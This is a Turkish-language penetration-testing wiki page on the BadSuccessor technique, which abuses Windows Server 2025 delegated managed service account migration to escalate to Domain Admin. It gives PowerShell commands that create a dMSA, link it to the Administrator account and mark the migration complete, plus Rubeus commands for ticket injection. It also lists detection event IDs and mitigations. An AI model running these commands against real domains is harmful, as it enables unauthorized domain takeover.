# BadSuccessor: Delegated MSA Migration Abuse ile Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Delegated Managed Service Accounts (**dMSA**), Windows Server 2025 ile gelen **gMSA**’lerin yeni nesil halefidir. Meşru bir migration iş akışı, yöneticilerin izinleri şeffaf biçimde korurken *eski* bir hesabı (kullanıcı, bilgisayar veya hizmet hesabı) dMSA ile değiştirmesine olanak tanır. Bu iş akışı `Start-ADServiceAccountMigration` ve `Complete-ADServiceAccountMigration` gibi PowerShell cmdlet’leriyle sunulur ve **dMSA nesnesinin** iki LDAP özniteliğine dayanır:

* **`msDS-ManagedAccountPrecededByLink`** – Eski, yerini aldığı hesaba giden *DN bağlantısı*.
* **`msDS-DelegatedMSAState`**       – Migration durumu (`0` = yok, `1` = devam ediyor, `2` = *tamamlandı*).<sup>[[1]](#references)</sup>

Bir saldırgan bir OU içinde **herhangi bir** dMSA oluşturabiliyor ve bu iki özniteliği doğrudan değiştirebiliyorsa, LSASS ve KDC dMSA’yı bağlantılı hesabın *halefi* olarak kabul eder. Saldırgan daha sonra dMSA olarak kimlik doğruladığında, bağlantılı hesabın **tüm ayrıcalıklarını devralır**; Administrator hesabı bağlanmışsa **Domain Admin** düzeyine kadar.<sup>[[1]](#references)</sup>

Bu teknik, Unit 42 tarafından 2025’te **BadSuccessor** olarak adlandırıldı. Microsoft daha sonra bu tekniğe **CVE-2025-53779** numarasını atadı ve **Ağustos 2025**’te bir güvenlik güncelleştirmesi yayımladı. Teknik, yamalanmamış Windows Server 2025 ortamlarında ve tehlikeli OU delegasyonlarının incelenmesinde önemini koruyor.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

Yama uygulanmış DC’lerde, saldırgan hedef hesabın migration özniteliklerine de yazabiliyorsa [iki taraflı bir dMSA migration](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch) hedef hesabı yine açığa çıkarabilir. Bu yöntem, özgün ve herhangi bir hedefi seçebilen saldırıya kıyasla daha sınırlıdır.

### Saldırı ön koşulları

1. **Bir Organizational Unit (OU)** içinde nesne oluşturmasına *izin verilen* ve aşağıdakilerden en az birine sahip olan bir hesap:
   * `Create Child` → **`msDS-DelegatedManagedServiceAccount`** nesne sınıfı
   * `Create Child` → **`All Objects`** (genel oluşturma)
2. LDAP ve Kerberos’a ağ bağlantısı (standart domaine katılmış senaryo / uzaktan saldırı).<sup>[[1]](#references)</sup>

## Savunmasız OU’ları Numaralandırma

Unit 42, her OU’nun güvenlik tanımlayıcılarını ayrıştıran ve gerekli ACE’leri vurgulayan bir PowerShell yardımcı betiği yayımladı:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Perde arkasında script, `(objectClass=organizationalUnit)` için sayfalandırılmış bir LDAP araması yapar ve her `nTSecurityDescriptor` için şunları kontrol eder:

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (nesne sınıfı *msDS-DelegatedManagedServiceAccount*)

## Exploitation Steps

Yazılabilir bir OU belirlendikten sonra saldırı yalnızca 3 LDAP yazma işlemi uzağınızdadır:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Replikasyondan sonra saldırgan `attacker_dMSA$` olarak **logon** olabilir veya bir Kerberos TGT isteyebilir – Windows, *önceki* hesabın token'ını oluşturur.<sup>[[1]](#references)</sup>

### Otomasyon

Birçok herkese açık PoC, parola alma ve ticket yönetimi de dahil olmak üzere tüm iş akışını kapsar:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec modülü – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Tespit ve Avlama

OU'larda **Nesne Denetimi**'ni etkinleştirin ve aşağıdaki Windows Güvenlik Olaylarını izleyin:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – **dMSA** nesnesinin oluşturulması
* **5136** – **`msDS-ManagedAccountPrecededByLink`** özniteliğinin değiştirilmesi
* **4662** – Belirli öznitelik değişiklikleri
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA için TGT verilmesi

`4662` (öznitelik değişikliği), `4741` (bilgisayar/hizmet hesabı oluşturulması) ve `4624` (sonraki oturum açma) olaylarını ilişkilendirmek, BadSuccessor etkinliğini hızla ortaya çıkarır. **XSIAM** gibi XDR çözümleri kullanıma hazır sorgularla birlikte gelir (bkz. kaynaklar).<sup>[[2]](#references)</sup>

## Azaltma

* **CVE-2025-53779** için Microsoft güvenlik güncelleştirmesini uygulayın ve her Windows Server 2025 etki alanı denetleyicisinin yama düzeyini doğrulayın.<sup>[[6]](#references)</sup>
* **En az ayrıcalık** ilkesini uygulayın; *Service Account* yönetimini yalnızca güvenilir rollere devredin.
* Açıkça gerekmeyen OU'lardan `Create Child` / `msDS-DelegatedManagedServiceAccount` izinlerini kaldırın.
* Yukarıda listelenen olay kimliklerini izleyin ve *Tier 0 dışı* kimliklerin dMSA oluşturması veya düzenlemesi durumunda uyarı verin.

## Ayrıca bkz.


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Active Directory'de Ayrıcalıkları Yükseltmek için dMSA'yı Kötüye Kullanma – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – İyi Hesaplar Kötüye Gittiğinde: Delegated Managed Service Accounts'tan Yararlanma](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor modülü](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Güvenlik Yanıt Merkezi – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
